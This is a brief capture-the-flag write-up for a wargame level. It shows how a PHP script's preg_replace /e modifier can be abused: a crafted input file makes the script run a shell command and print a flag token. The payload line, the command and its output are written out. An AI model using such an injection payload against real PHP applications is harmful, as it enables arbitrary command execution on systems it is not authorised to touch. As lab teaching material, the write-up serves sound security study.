Two files in the /home
	- One php script
	- The same script, but *compiled*

Of note, despite the script wanting two arguments, the second one is completely useless.

------------------------

The script makes extensive use of regex, and uses this pattern modifier: "\e":

https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php

\e:
	This feature was DEPRECATED in PHP 5.5.0, and REMOVED as of PHP 7.0.0.
	If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string. Single quotes, double quotes, backslashes (\) and NULL chars will be escaped by backslashes in substituted backreferences. 

-----
There is a security warning in the documentation, explaining how this can be used by a third party to execute arbitrary code.
We can use therefore use this to call the "exec" command, which can be used to execute shell code 

In a file (i.e. /tmp/a), we put

[x .<h1>{${exec(getflag)}}</h1>]

And then
./level06 /tmp/a

We get:

PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
 x <h1></h1>
